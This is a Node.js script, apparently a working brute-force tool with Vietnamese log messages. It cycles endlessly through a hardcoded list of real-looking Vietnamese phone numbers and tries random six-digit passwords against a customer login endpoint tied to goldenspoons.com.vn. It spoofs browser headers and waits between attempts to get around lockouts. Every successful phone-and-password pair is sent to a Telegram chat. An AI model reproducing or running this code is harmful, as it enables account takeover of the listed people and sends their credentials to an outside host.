require('dotenv').config();
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const keep_alive = require('./keep_alive.js');

const token = process.env.TELEGRAM_BOT_TOKEN;
const chatId = process.env.ID_TELEGRAM
const bot = new TelegramBot(token, {polling: true});

async function sendTelegramMessage(message) {
    try {
        await bot.sendMessage(chatId, message);
    } catch (error) {
        console.error(`Lỗi gửi tin nhắn đến Telegram (chatId: ${id}):`, error);
    }
}

const dataPhone = [
    566369312,
    562067089,
    355086154,
    566354244,
    569682206,
    569704506,
    824566927,
    948572994,
    963630751,
    868024188,
    347997860,
    372861841,
    373177211,
    867012054,
    342309826,
    339426085,
    989375156,
    776116571,
    869834784,
    385060229,
    792108492,
    889357819,
    569642436,
    796806380,
    842322265,
    988073365,
    569702547,
    569685399,
    359265255,
    868819598,
    329325097,
    397344631,
    398399804,
    398841944,
    396063127,
    328194698,
    888771173,
    334650590,
    867956086,
    566369312,
    332753167,
    564866474,
    386918826,
    364278226,
    867442707,
    357808167,
    334213547,
    985899294,
    387894853,
    972357104,
    328212659,
    569759599,
    896914581,
    588459809,
    568983289,
    329829901,
    369185823,
    816086398,
    569649921,
    568191348,
    333853822,
    862206801,
    327176098,
    339407485,
    372802704,
    374923065,
    862954124,
    327379112,
    328344738
]

async function random() {
    return Math.floor(100000 + Math.random() * 900000);
}

async function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function login(phoneNumber, retries = 5) {
    if (retries <= 0) {
        return null;
    }
    if (retries < 5) {
        await delay(7000)
    }
    const password = await random();
    const url = 'https://backend2.tgss.vn/2e55ad4eb9ad4631b65efe18710b6feb/customers/login';
    const data = {
        username: `${phoneNumber}`,
        password: `${password}`
    };
    try {
        const response = await axios.post(url, data, {
            headers: {
                'accept': 'application/json, text/plain, */*',
                'clientid': '13c5c3fa-2e91-4169-867a-6f0f10fa1567',
                'content-type': 'application/json',
                'origin': 'https://goldenspoons.com.vn',
                'referer': 'https://goldenspoons.com.vn/',
                'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
            }
        });
        if (response.data.success) {
            return {phoneNumber, password}
        }
        return await login(phoneNumber, retries - 1)
    } catch (error) {
        console.error('Error during login:', error.response ? error.response.data : error.message);
    }
}

async function search() {
    for (const phone of dataPhone) {
        const phoneNumber = `0${phone}`;
        const result = await login(phoneNumber);
        if (result != null) {
            const messages = `Thông tin đăng nhập ${phoneNumber} ${result.password}`
            await sendTelegramMessage(messages);
        } else {
            console.log(`Tạm khoá 30 phút  ${phoneNumber}`)
        }
    }
}

async function runMain() {
    while (true) {
        await search();
    }
}

runMain();
